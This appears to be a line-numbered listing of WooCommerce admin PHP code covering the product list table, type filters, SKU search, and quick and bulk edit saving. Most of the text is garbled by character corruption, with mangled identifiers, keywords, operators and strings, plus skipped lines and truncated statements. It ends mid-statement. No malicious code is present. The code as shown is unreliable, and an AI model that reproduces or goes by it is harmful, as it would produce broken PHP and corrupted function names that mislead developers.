336 iàĞ
$po¡_ty³_objeù
->
public
 ) {

337 iàĞ
	`š_¬¿y
Ğ
$po¡
->
po¡_¡©us
, 
	`¬¿y
( 'pending', 'draft', 'future' ) ) ) {

338 iàĞ
$ÿn_ed™_po¡
 )

339 
$aùiÚs
['v›w'] = '<¨h»f="' . 
	`esc_u¾
Ğ
	`add_qu”y_¬g
Ğ'´ev›w', 'Œue', 
	`g‘_³rm®šk
Ğ
$po¡
->
ID
 ) ) ) . '"™Ë="' . 
	`esc_©Œ
Ğ
	`¥rštf
Ğ
	`__
Ğ'P»v›w &#8220;%s&#8221;', 'woocomm”û' ), 
$t™Ë
 ) ) . '"„el="permalink">' . __( 'Preview', 'woocommerce' ) . '</a>';

340 } 
	`–£if
 ( 'Œash' !ğ
$po¡
->
po¡_¡©us
 ) {

341 
$aùiÚs
['v›w'] = '<¨h»f="' . 
	`g‘_³rm®šk
Ğ
$po¡
->
ID
 ) . '"™Ë="' . 
	`esc_©Œ
Ğ
	`¥rštf
Ğ
	`__
Ğ'V›w &#8220;%s&#8221;', 'woocomm”û' ), 
$t™Ë
 ) ) . '"„el="permalink">' . __( 'View', 'woocommerce' ) . '</a>';

345 
$aùiÚs
 = 
	`­¶y_f‹rs
Ğ'po¡_row_aùiÚs', $aùiÚs, 
$po¡
 );

347 
echo
 '<div class="row-actions">';

349 
$i
 = 0;

350 
$aùiÚ_couÁ
 = (
$aùiÚs
);

352 
	`fÜ—ch
 ( 
$aùiÚs
 
as
 
$aùiÚ
 => 
$lšk
 ) {

353 ++
$i
;

354 Ğ
$i
 =ğ
$aùiÚ_couÁ
 ) ? 
$£p
 = '' : $sep = ' | ';

355 
echo
 '<¥ª cÏss="' . 
$aùiÚ
 . '">' . 
$lšk
 . 
$£p
 . '</span>';

357 
echo
 '</div>';

359 
	`g‘_šlše_d©a
Ğ
$po¡
 );

362 
echo
 '

363 <
div
 
şass
="hidd’" 
id
="woocommerce_inline_' . $post->ID . '">

364 <
div
 
şass
="menu_order">' . $post->menu_order . '</div>

365 <
div
 
şass
="sku">' . $the_product->sku . '</div>

366 <
div
 
şass
="regular_price">' . $the_product->regular_price . '</div>

367 <
div
 
şass
="sale_price">' . $the_product->sale_price . '</div>

368 <
div
 
şass
="weight">' . $the_product->weight . '</div>

369 <
div
 
şass
="length">' . $the_product->length . '</div>

370 <
div
 
şass
="width">' . $the_product->width . '</div>

371 <
div
 
şass
="height">' . $the_product->height . '</div>

372 <
div
 
şass
="visibility">' . $the_product->visibility . '</div>

373 <
div
 
şass
="stock_status">' . $the_product->stock_status . '</div>

374 <
div
 
şass
="stock">' . $the_product->stock . '</div>

375 <
div
 
şass
="manage_stock">' . $the_product->manage_stock . '</div>

376 <
div
 
şass
="featured">' . $the_product->featured . '</div>

377 <
div
 
şass
="product_type">' . $the_product->product_type . '</div>

378 <
div
 
şass
="product_is_virtual">' . $the_product->virtual . '</div>

379 <
div
 
şass
="tax_status">' . $the_product->tax_status . '</div>

380 <
div
 
şass
="tax_class">' . $the_product->tax_class . '</div>

381 <
div
 
şass
="backorders">' . $the_product->backorders . '</div>

382 </
div
>

387 
echo
 
$the_´oduù
->
	`g‘_sku
() ? $the_product->get_sku() : '<span class="na">&ndash;</span>';

390 iàĞ'grou³d' =ğ
$the_´oduù
->
´oduù_ty³
 ) {

391 
echo
 '<¥ª cÏss="´oduù-ty³ grou³d" d©a-t="' . 
	`__
( 'Grouped', 'woocommerce' ) . '"></span>';

392 } 
	`–£if
 ( 'ex‹º®' =ğ
$the_´oduù
->
´oduù_ty³
 ) {

393 
echo
 '<¥ª cÏss="´oduù-ty³ ex‹º®" d©a-t="' . 
	`__
( 'External/Affiliate', 'woocommerce' ) . '"></span>';

394 } 
	`–£if
 ( 'sim¶e' =ğ
$the_´oduù
->
´oduù_ty³
 ) {

396 iàĞ
$the_´oduù
->
	`is_vœtu®
() ) {

397 
echo
 '<¥ª cÏss="´oduù-ty³ vœtu®" d©a-t="' . 
	`__
( 'Virtual', 'woocommerce' ) . '"></span>';

398 } 
	`–£if
 ( 
$the_´oduù
->
	`is_dowÆßdabË
() ) {

399 
echo
 '<¥ª cÏss="´oduù-ty³ dowÆßdabË" d©a-t="' . 
	`__
( 'Downloadable', 'woocommerce' ) . '"></span>';

401 
echo
 '<¥ª cÏss="´oduù-ty³ sim¶e" d©a-t="' . 
	`__
( 'Simple', 'woocommerce' ) . '"></span>';

404 } 
	`–£if
 ( 'v¬ŸbË' =ğ
$the_´oduù
->
´oduù_ty³
 ) {

405 
echo
 '<¥ª cÏss="´oduù-ty³ v¬ŸbË" d©a-t="' . 
	`__
( 'Variable', 'woocommerce' ) . '"></span>';

408 
echo
 '<¥ª cÏss="´oduù-ty³ ' . 
$the_´oduù
->
´oduù_ty³
 . '" d©a-t="' . 
	`ucfœ¡
( $the_product->product_type ) . '"></span>';

412 
echo
 
$the_´oduù
->
	`g‘_´iû_html
() ? $the_product->get_price_html() : '<span class="na">&ndash;</span>';

416 iàĞ! 
$‹rms
 = 
	`g‘_the_‹rms
Ğ
$po¡
->
ID
, 
$cŞumn
 ) ) {

417 
echo
 '<span class="na">&ndash;</span>';

419 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 ) {

420 
$‹rmli¡
[] = '<¨h»f="' . 
	`admš_u¾
Ğ'ed™.php?' . 
$cŞumn
 . '=' . 
$‹rm
->
¦ug
 . '&po¡_ty³õroduù' ) . ' ">' . $‹rm->
Çme
 . '</a>';

423 
echo
 
	`im¶ode
Ğ', ', 
$‹rmli¡
 );

427 
$u¾
 = 
	`wp_nÚû_u¾
Ğ
	`admš_u¾
Ğ'admš-ajax.php?aùiÚ=woocomm”û_ã©u»_´oduù&´oduù_id=' . 
$po¡
->
ID
 ), 'woocommerce-feature-product' );

428 
echo
 '<¨h»f="' . 
	`esc_u¾
Ğ
$u¾
 ) . '"™Ë="'. 
	`__
( 'Toggle featured', 'woocommerce' ) . '">';

429 iàĞ
$the_´oduù
->
	`is_ã©u»d
() ) {

430 
echo
 '<¥ª cÏss="wc-ã©u»ds" d©a-t="' . 
	`__
( 'Yes', 'woocommerce' ) . '">' . __( 'Yes', 'woocommerce' ) . '</span>';

432 
echo
 '<¥ª cÏss="wc-ã©u»d‚Ù-ã©u»ds" d©a-t="' . 
	`__
( 'No', 'woocommerce' ) . '">' . __( 'No', 'woocommerce' ) . '</span>';

434 
echo
 '</a>';

438 iàĞ
$the_´oduù
->
	`is_š_¡ock
() ) {

439 
echo
 '<m¬k cÏss="š¡ock">' . 
	`__
( 'In stock', 'woocommerce' ) . '</mark>';

441 
echo
 '<m¬k cÏss="outof¡ock">' . 
	`__
( 'Out of stock', 'woocommerce' ) . '</mark>';

444 iàĞ
$the_´oduù
->
	`mªagšg_¡ock
() ) {

445 
echo
 ' &times; ' . 
$the_´oduù
->
	`g‘_tÙ®_¡ock
();

453 
	}
}

464 
public
 
funùiÚ
 
	$cu¡om_cŞumns_sÜt
Ğ
$cŞumns
 ) {

465 
$cu¡om
 = 
	`¬¿y
(

471  
	`wp_·r£_¬gs
Ğ
$cu¡om
, 
$cŞumns
 );

472 
	}
}

483 
public
 
funùiÚ
 
	$cu¡om_cŞumns_Üd”by
Ğ
$v¬s
 ) {

484 iàĞ
	`is£t
Ğ
$v¬s
['orderby'] ) ) {

485 iàĞ'´iû' =ğ
$v¬s
['orderby'] ) {

486 
$v¬s
 = 
	`¬¿y_m”ge
Ğ$v¬s, 
	`¬¿y
(

491 iàĞ'ã©u»d' =ğ
$v¬s
['orderby'] ) {

492 
$v¬s
 = 
	`¬¿y_m”ge
Ğ$v¬s, 
	`¬¿y
(

497 iàĞ'sku' =ğ
$v¬s
['orderby'] ) {

498 
$v¬s
 = 
	`¬¿y_m”ge
Ğ$v¬s, 
	`¬¿y
(

505  
$v¬s
;

506 
	}
}

516 
public
 
funùiÚ
 
	$deçuÉ_sÜtšg_lšk
Ğ
$v›ws
 ) {

517 
glob®
 
$po¡_ty³
, 
$wp_qu”y
;

519 iàĞ! 
	`cu¼’t_u£r_ÿn
('edit_others_pages') ) {

520  
$v›ws
;

523 
$şass
 = ( 
	`is£t
Ğ
$wp_qu”y
->
qu”y
['orderby'] ) && $wp_query->query['orderby'] == 'menu_orderitle' ) ? 'current' : '';

524 
$qu”y_¡ršg
 = 
	`»move_qu”y_¬g
(
	`¬¿y
( 'orderby', 'order' ));

525 
$qu”y_¡ršg
 = 
	`add_qu”y_¬g
Ğ'Üd”by', 
	`u¾’code
('menu_orderitle'), $query_string );

526 
$qu”y_¡ršg
 = 
	`add_qu”y_¬g
Ğ'Üd”', 
	`u¾’code
('ASC'), $query_string );

527 
$v›ws
['byÜd”'] = '<¨h»f="'. 
$qu”y_¡ršg
 . '" cÏss="' . 
	`esc_©Œ
Ğ
$şass
 ) . '">' . 
	`__
( 'Sort Products', 'woocommerce' ) . '</a>';

529  
$v›ws
;

530 
	}
}

535 
public
 
funùiÚ
 
	$´oduù_f‹rs
() {

536 
glob®
 
$ty³now
, 
$wp_qu”y
;

538 iàĞ'´oduù' !ğ
$ty³now
 ) {

543 
	`wc_´oduù_drİdown_ÿ‹gÜ›s
();

546 
$‹rms
 = 
	`g‘_‹rms
( 'product_type' );

547 
$ouut
 = '<select‚ame="product_type" id="dropdown_product_type">';

548 
$ouut
 .ğ'<İtiÚ v®ue="">' . 
	`__
( 'Show‡ll…roductypes', 'woocommerce' ) . '</option>';

550 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 ) {

551 
$ouut
 .ğ'<İtiÚ v®ue="' . 
	`§n™ize_t™Ë
Ğ
$‹rm
->
Çme
 ) . '" ';

553 iàĞ
	`is£t
Ğ
$wp_qu”y
->
qu”y
['product_type'] ) ) {

554 
$ouut
 .ğ
	`£Ëùed
Ğ
$‹rm
->
¦ug
, 
$wp_qu”y
->
qu”y
['´oduù_ty³'], 
çl£
 );

557 
$ouut
 .= '>';

559  
$‹rm
->
Çme
 ) {

561 
$ouut
 .ğ
	`__
( 'Grouped…roduct', 'woocommerce' );

564 
$ouut
 .ğ
	`__
( 'External/Affiliate…roduct', 'woocommerce' );

567 
$ouut
 .ğ
	`__
( 'Variable…roduct', 'woocommerce' );

570 
$ouut
 .ğ
	`__
( 'Simple…roduct', 'woocommerce' );

574 
$ouut
 .ğ
	`ucfœ¡
Ğ
$‹rm
->
Çme
 );

578 
$ouut
 .= " ($term->count)</option>";

580 iàĞ'sim¶e' =ğ
$‹rm
->
Çme
 ) {

582 
$ouut
 .= '<option value="downloadable" ';

584 iàĞ
	`is£t
Ğ
$wp_qu”y
->
qu”y
['product_type'] ) ) {

585 
$ouut
 .ğ
	`£Ëùed
Ğ'dowÆßdabË', 
$wp_qu”y
->
qu”y
['´oduù_ty³'], 
çl£
 );

588 
$ouut
 .ğ'> &¿¼; ' . 
	`__
( 'Downloadable', 'woocommerce' ) . '</option>';

590 
$ouut
 .= '<option value="virtual" ';

592 iàĞ
	`is£t
Ğ
$wp_qu”y
->
qu”y
['product_type'] ) ) {

593 
$ouut
 .ğ
	`£Ëùed
Ğ'vœtu®', 
$wp_qu”y
->
qu”y
['´oduù_ty³'], 
çl£
 );

596 
$ouut
 .ğ'> &¿¼; ' . 
	`__
( 'Virtual', 'woocommerce' ) . '</option>';

600 
$ouut
 .= '</select>';

602 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_f‹rs', 
$ouut
 );

603 
	}
}

610 
public
 
funùiÚ
 
	$´oduù_f‹rs_qu”y
Ğ
$qu”y
 ) {

611 
glob®
 
$ty³now
, 
$wp_qu”y
;

613 iàĞ'´oduù' =ğ
$ty³now
 ) {

615 iàĞ
	`is£t
Ğ
$qu”y
->
qu”y_v¬s
['product_type'] ) ) {

617 iàĞ'dowÆßdabË' =ğ
$qu”y
->
qu”y_v¬s
['product_type'] ) {

618 
$qu”y
->
qu”y_v¬s
['product_type'] = '';

619 
$qu”y
->
qu”y_v¬s
['meta_value'] = 'yes';

620 
$qu”y
->
qu”y_v¬s
['meta_key'] = '_downloadable';

621 } 
	`–£if
 ( 'vœtu®' =ğ
$qu”y
->
qu”y_v¬s
['product_type'] ) {

622 
$qu”y
->
qu”y_v¬s
['product_type'] = '';

623 
$qu”y
->
qu”y_v¬s
['meta_value'] = 'yes';

624 
$qu”y
->
qu”y_v¬s
['meta_key'] = '_virtual';

629 iàĞ
	`is£t
Ğ
$_GET
['product_cat'] ) && '0' == $_GET['product_cat'] ) {

630 
$qu”y
->
qu”y_v¬s
['x_qu”y'][] = 
	`¬¿y
(

633 '‹rms' => 
	`g‘_‹rms
Ğ'´oduù_ÿt', 
	`¬¿y
( 'fields' => 'ids' ) ),

638 
	}
}

645 
public
 
funùiÚ
 
	$´oduù_£¬ch
Ğ
$wh”e
 ) {

646 
glob®
 
$·g’ow
, 
$wpdb
, 
$wp
;

648 iàĞ'ed™.php' !ğ
$·g’ow
 || ! 
	`is_£¬ch
(è|| ! 
	`is£t
Ğ
$wp
->
qu”y_v¬s
['s'] ) || 'product' != $wp->query_vars['post_type'] ) {

649  
$wh”e
;

652 
$£¬ch_ids
 = 
	`¬¿y
();

653 
$‹rms
 = 
	`ex¶ode
Ğ',', 
$wp
->
qu”y_v¬s
['s'] );

655 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 ) {

656 iàĞ
	`is_num”ic
Ğ
$‹rm
 ) ) {

657 
$£¬ch_ids
[] = 
$‹rm
;

660 
$sku_to_id
 = 
$wpdb
->
	`g‘_cŞ
Ğ$wpdb->
	`´•¬e
Ğ"SELECT…o¡_id FROM {$wpdb->po¡m‘a} WHERE m‘a_key='_sku' AND m‘a_v®uLIKE '%%%s%%';", 
	`wc_ş—n
Ğ
$‹rm
 ) ) );

662 iàĞ
$sku_to_id
 && ( $sku_to_id ) > 0 ) {

663 
$£¬ch_ids
 = 
	`¬¿y_m”ge
Ğ$£¬ch_ids, 
$sku_to_id
 );

667 
$£¬ch_ids
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
( 'absint', $search_ids ) );

669 iàĞĞ
$£¬ch_ids
 ) > 0 ) {

670 
$wh”e
 = 
	`¡r_»¶aû
Ğ')))', "èOR ({$wpdb->po¡s}.ID IN (" . 
	`im¶ode
Ğ',', 
$£¬ch_ids
 ) . "))))", $where );

673  
$wh”e
;

674 
	}
}

681 
public
 
funùiÚ
 
	$di§bË_checked_Útİ
Ğ
$¬gs
 ) {

682 iàĞ'´oduù_ÿt' =ğ
$¬gs
['taxonomy'] ) {

683 
$¬gs
['checked_Útİ'] = 
çl£
;

686  
$¬gs
;

687 
	}
}

696 
public
 
funùiÚ
 
	$bulk_ed™
Ğ
$cŞumn_Çme
, 
$po¡_ty³
 ) {

697 iàĞ'´iû' !ğ
$cŞumn_Çme
 || '´oduù' !ğ
$po¡_ty³
 ) {

701 
	`šşude
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/admin/views/html-bulk-edit-product.php' );

702 
	}
}

711 
public
 
funùiÚ
 
	$quick_ed™
Ğ
$cŞumn_Çme
, 
$po¡_ty³
 ) {

712 iàĞ'´iû' !ğ
$cŞumn_Çme
 || '´oduù' !ğ
$po¡_ty³
 ) {

716 
	`šşude
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/admin/views/html-quick-edit-product.php' );

717 
	}
}

727 
public
 
funùiÚ
 
	$bulk_ªd_quick_ed™_§ve_po¡
Ğ
$po¡_id
, 
$po¡
 ) {

729 iàĞ
	`defšed
Ğ'DOING_AUTOSAVE' ) && 
DOING_AUTOSAVE
 ) {

730  
$po¡_id
;

734 iàĞ
	`wp_is_po¡_»visiÚ
Ğ
$po¡_id
 ) || 
	`wp_is_po¡_auto§ve
( $post_id ) ) {

735  
$po¡_id
;

739 iàĞ'´oduù' !ğ
$po¡
->
po¡_ty³
 ) {

740  
$po¡_id
;

744 iàĞ! 
	`cu¼’t_u£r_ÿn
Ğ'ed™_po¡', 
$po¡_id
 ) ) {

745  
$po¡_id
;

749 iàĞ! 
	`is£t
Ğ
$_REQUEST
['woocommerce_quick_edit_nonce'] ) && ! isset( $_REQUEST['woocommerce_bulk_edit_nonce'] ) ) {

750  
$po¡_id
;

752 iàĞ
	`is£t
Ğ
$_REQUEST
['woocomm”û_quick_ed™_nÚû'] ) && ! 
	`wp_v”ify_nÚû
( $_REQUEST['woocommerce_quick_edit_nonce'], 'woocommerce_quick_edit_nonce' ) ) {

753  
$po¡_id
;

755 iàĞ
	`is£t
Ğ
$_REQUEST
['woocomm”û_bulk_ed™_nÚû'] ) && ! 
	`wp_v”ify_nÚû
( $_REQUEST['woocommerce_bulk_edit_nonce'], 'woocommerce_bulk_edit_nonce' ) ) {

756  
$po¡_id
;

760 
$´oduù
 = 
	`g‘_´oduù
Ğ
$po¡
 );

762 iàĞ! 
	`em±y
Ğ
$_REQUEST
['woocommerce_quick_edit'] ) ) {

763 
$this
->
	`quick_ed™_§ve
Ğ
$po¡_id
, 
$´oduù
 );

765 
$this
->
	`bulk_ed™_§ve
Ğ
$po¡_id
, 
$´oduù
 );

769 
	`wc_d–‘e_´oduù_Œªs›Ás
Ğ
$po¡_id
 );

771  
$po¡_id
;

772 
	}
}

777 
´iv©e
 
funùiÚ
 
	$quick_ed™_§ve
Ğ
$po¡_id
, 
$´oduù
 ) {

778 
glob®
 
$wpdb
;

780 
$Şd_»guÏr_´iû
 = 
$´oduù
->
»guÏr_´iû
;

781 
$Şd_§Ë_´iû
 = 
$´oduù
->
§Ë_´iû
;

784 iàĞ
	`is£t
Ğ
$_REQUEST
['_sku'] ) ) {

785 
$sku
 = 
	`g‘_po¡_m‘a
Ğ
$po¡_id
, '_sku', 
Œue
 );

786 
$Ãw_sku
 = 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_REQUEST
['_sku'] ) );

788 iàĞ
$Ãw_sku
 !=ğ
$sku
 ) {

789 iàĞ! 
	`em±y
Ğ
$Ãw_sku
 ) ) {

790 
$sku_exi¡s
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
("

791 
SELECT
 
$wpdb
->
po¡s
.
ID


792 
FROM
 
$wpdb
->
po¡s


793 
LEFT
 
JOIN
 
$wpdb
->
po¡m‘a
 
	`ON
 ($wpdb->
po¡s
.
ID
 = $wpdb->po¡m‘a.
po¡_id
)

794 
WHERE
 
$wpdb
->
po¡s
.
po¡_ty³
 = 'product'

795 
AND
 
$wpdb
->
po¡s
.
po¡_¡©us
 = 'publish'

796 
AND
 
$wpdb
->
po¡m‘a
.
m‘a_key
 = '_sku' AND $wpdb->po¡m‘a.
m‘a_v®ue
 = '%s'

799 iàĞ! 
$sku_exi¡s
 ) {

800 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sku', 
$Ãw_sku
 );

803 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sku', '' );

808 iàĞ
	`is£t
Ğ
$_REQUEST
['_weight'] ) ) {

809 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_weight', 
	`wc_ş—n
Ğ
$_REQUEST
['_weight'] ) );

812 iàĞ
	`is£t
Ğ
$_REQUEST
['_length'] ) ) {

813 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_Ëngth', 
	`wc_ş—n
Ğ
$_REQUEST
['_length'] ) );

816 iàĞ
	`is£t
Ğ
$_REQUEST
['_width'] ) ) {

817 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_width', 
	`wc_ş—n
Ğ
$_REQUEST
['_width'] ) );

820 iàĞ
	`is£t
Ğ
$_REQUEST
['_height'] ) ) {

821 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_height', 
	`wc_ş—n
Ğ
$_REQUEST
['_height'] ) );

824 iàĞ
	`is£t
Ğ
$_REQUEST
['_visibility'] ) ) {

825 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_visib™y', 
	`wc_ş—n
Ğ
$_REQUEST
['_visibility'] ) );

828 iàĞ
	`is£t
Ğ
$_REQUEST
['_featured'] ) ) {

829 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_featured', 'yes' );

831 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_featured', 'no' );

834 iàĞ
	`is£t
Ğ
$_REQUEST
['_tax_status'] ) ) {

835 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_x_¡©us', 
	`wc_ş—n
Ğ
$_REQUEST
['_tax_status'] ) );

838 iàĞ
	`is£t
Ğ
$_REQUEST
['_tax_class'] ) ) {

839 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_x_şass', 
	`wc_ş—n
Ğ
$_REQUEST
['_tax_class'] ) );

842 iàĞ
$´oduù
->
	`is_ty³
('simple') || $product->is_type('external') ) {

844 iàĞ
	`is£t
Ğ
$_REQUEST
['_regular_price'] ) ) {

845 
$Ãw_»guÏr_´iû
 = 
$_REQUEST
['_»guÏr_´iû'] ==ğ'' ? '' : 
	`wc_fÜm©_decim®
( $_REQUEST['_regular_price'] );

846 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_»guÏr_´iû', 
$Ãw_»guÏr_´iû
 );

848 
$Ãw_»guÏr_´iû
 = 
nuÎ
;

850 iàĞ
	`is£t
Ğ
$_REQUEST
['_sale_price'] ) ) {

851 
$Ãw_§Ë_´iû
 = 
$_REQUEST
['_§Ë_´iû'] ==ğ'' ? '' : 
	`wc_fÜm©_decim®
( $_REQUEST['_sale_price'] );

852 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_§Ë_´iû', 
$Ãw_§Ë_´iû
 );

854 
$Ãw_§Ë_´iû
 = 
nuÎ
;

858 
$´iû_chªged
 = 
çl£
;

860 iàĞ! 
	`is_nuÎ
Ğ
$Ãw_»guÏr_´iû
 ) && $Ãw_»guÏr_´iû !ğ
$Şd_»guÏr_´iû
 ) {

861 
$´iû_chªged
 = 
Œue
;

862 } 
	`–£if
 ( ! 
	`is_nuÎ
Ğ
$Ãw_§Ë_´iû
 ) && $Ãw_§Ë_´iû !ğ
$Şd_§Ë_´iû
 ) {

863 
$´iû_chªged
 = 
Œue
;

866 iàĞ
$´iû_chªged
 ) {

867 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sale_price_dates_from', '' );

868 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sale_price_dates_to', '' );

870 iàĞ! 
	`is_nuÎ
Ğ
$Ãw_§Ë_´iû
 ) && $new_sale_price !== '' ) {

871 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_´iû', 
$Ãw_§Ë_´iû
 );

873 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_´iû', 
$Ãw_»guÏr_´iû
 );

879 iàĞ
	`is£t
Ğ
$_REQUEST
['_stock_status'] ) ) {

880 
	`wc_upd©e_´oduù_¡ock_¡©us
Ğ
$po¡_id
, 
	`wc_ş—n
Ğ
$_REQUEST
['_stock_status'] ) );

884 iàĞ! 
$´oduù
->
	`is_ty³
('grouped') ) {

885 iàĞ
	`is£t
Ğ
$_REQUEST
['_manage_stock'] ) ) {

886 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_manage_stock', 'yes' );

887 
	`wc_upd©e_´oduù_¡ock
Ğ
$po¡_id
, 
	`štv®
Ğ
$_REQUEST
['_stock'] ) );

889 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_manage_stock', 'no' );

890 
	`wc_upd©e_´oduù_¡ock
Ğ
$po¡_id
, 0 );

893 iàĞ! 
	`em±y
Ğ
$_REQUEST
['_backorders'] ) ) {

894 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_backÜd”s', 
	`wc_ş—n
Ğ
$_REQUEST
['_backorders'] ) );

898 
	`do_aùiÚ
Ğ'woocomm”û_´oduù_quick_ed™_§ve', 
$´oduù
 );

899 
	}
}

904 
public
 
funùiÚ
 
	$bulk_ed™_§ve
Ğ
$po¡_id
, 
$´oduù
 ) {

906 
$Şd_»guÏr_´iû
 = 
$´oduù
->
»guÏr_´iû
;

907 
$Şd_§Ë_´iû
 = 
$´oduù
->
§Ë_´iû
;

910 iàĞ! 
	`em±y
Ğ
$_REQUEST
['chªge_weight'] ) && 
	`is£t
( $_REQUEST['_weight'] ) ) {

911 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_weight', 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_REQUEST
['_weight'] ) ) );

914 iàĞ! 
	`em±y
Ğ
$_REQUEST
['change_dimensions'] ) ) {

915 iàĞ
	`is£t
Ğ
$_REQUEST
['_length'] ) ) {

916 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_Ëngth', 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_REQUEST
['_length'] ) ) );

918 iàĞ
	`is£t
Ğ
$_REQUEST
['_width'] ) ) {

919 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_width', 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_REQUEST
['_width'] ) ) );

921 iàĞ
	`is£t
Ğ
$_REQUEST
['_height'] ) ) {

922 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_height', 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_REQUEST
['_height'] ) ) );

926 iàĞ! 
	`em±y
Ğ
$_REQUEST
['_tax_status'] ) ) {

927 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_x_¡©us', 
	`wc_ş—n
Ğ
$_REQUEST
['_tax_status'] ) );

930 iàĞ! 
	`em±y
Ğ
$_REQUEST
['_tax_class'] ) ) {

931 
$x_şass
 = 
	`wc_ş—n
Ğ
$_REQUEST
['_tax_class'] );

932 iàĞ'¡ªd¬d' =ğ
$x_şass
 ) {

933 
$x_şass
 = '';

935 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_x_şass', 
$x_şass
 );

938 iàĞ! 
	`em±y
Ğ
$_REQUEST
['_stock_status'] ) ) {

939 
	`wc_upd©e_´oduù_¡ock_¡©us
Ğ
$po¡_id
, 
	`wc_ş—n
Ğ
$_REQUEST
['_stock_status'] ) );

942 iàĞ! 
	`em±y
Ğ
$_REQUEST
['_visibility'] ) ) {

943 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_visib™y', 
	`¡r¦ashes
Ğ
$_REQUEST
['_visibility'] ) );

946 iàĞ! 
	`em±y
Ğ
$_REQUEST
['_featured'] ) ) {

947 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_ã©u»d', 
	`¡r¦ashes
Ğ
$_REQUEST
['_featured'] ) );

951 iàĞ
$´oduù
->
	`is_ty³
( 'simple' ) || $product->is_type( 'external' ) ) {

953 
$´iû_chªged
 = 
çl£
;

955 iàĞ! 
	`em±y
Ğ
$_REQUEST
['change_regular_price'] ) ) {

957 
$chªge_»guÏr_´iû
 = 
	`absšt
Ğ
$_REQUEST
['change_regular_price'] );

958 
$»guÏr_´iû
 = 
	`esc_©Œ
Ğ
	`¡r¦ashes
Ğ
$_REQUEST
['_regular_price'] ) );

960  
$chªge_»guÏr_´iû
 ) {

962 
$Ãw_´iû
 = 
$»guÏr_´iû
;

965 iàĞ
	`¡r¡r
Ğ
$»guÏr_´iû
, '%' ) ) {

966 
$³rûÁ
 = 
	`¡r_»¶aû
Ğ'%', '', 
$»guÏr_´iû
 ) / 100;

967 
$Ãw_´iû
 = 
$Şd_»guÏr_´iû
 + ( 
	`round
Ğ$Şd_»guÏr_´iû * 
$³rûÁ
, 
	`absšt
Ğ
	`g‘_İtiÚ
( 'woocommerce_price_num_decimals' ) ) ) );

969 
$Ãw_´iû
 = 
$Şd_»guÏr_´iû
 + 
$»guÏr_´iû
;

973 iàĞ
	`¡r¡r
Ğ
$»guÏr_´iû
, '%' ) ) {

974 
$³rûÁ
 = 
	`¡r_»¶aû
Ğ'%', '', 
$»guÏr_´iû
 ) / 100;

975 
$Ãw_´iû
 = 
$Şd_»guÏr_´iû
 - ( 
	`round
 ( $Şd_»guÏr_´iû * 
$³rûÁ
, 
	`absšt
Ğ
	`g‘_İtiÚ
( 'woocommerce_price_num_decimals' ) ) ) );

977 
$Ãw_´iû
 = 
$Şd_»guÏr_´iû
 - 
$»guÏr_´iû
;

985 iàĞ
	`is£t
Ğ
$Ãw_´iû
 ) && $Ãw_´iû !ğ
$Şd_»guÏr_´iû
 ) {

986 
$´iû_chªged
 = 
Œue
;

987 
$Ãw_´iû
 = 
	`round
Ğ$Ãw_´iû, 
	`absšt
Ğ
	`g‘_İtiÚ
( 'woocommerce_price_num_decimals' ) ) );

988 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_»guÏr_´iû', 
$Ãw_´iû
 );

989 
$´oduù
->
»guÏr_´iû
 = 
$Ãw_´iû
;

993 iàĞ! 
	`em±y
Ğ
$_REQUEST
['change_sale_price'] ) ) {

995 
$chªge_§Ë_´iû
 = 
	`absšt
Ğ
$_REQUEST
['change_sale_price'] );

996 
$§Ë_´iû
 = 
	`esc_©Œ
Ğ
	`¡r¦ashes
Ğ
$_REQUEST
['_sale_price'] ) );

998  
$chªge_§Ë_´iû
 ) {

1000 
$Ãw_´iû
 = 
$§Ë_´iû
;

1003 iàĞ
	`¡r¡r
Ğ
$§Ë_´iû
, '%' ) ) {

1004 
$³rûÁ
 = 
	`¡r_»¶aû
Ğ'%', '', 
$§Ë_´iû
 ) / 100;

1005 
$Ãw_´iû
 = 
$Şd_§Ë_´iû
 + ( $Şd_§Ë_´iû * 
$³rûÁ
 );

1007 
$Ãw_´iû
 = 
$Şd_§Ë_´iû
 + 
$§Ë_´iû
;

1011 iàĞ
	`¡r¡r
Ğ
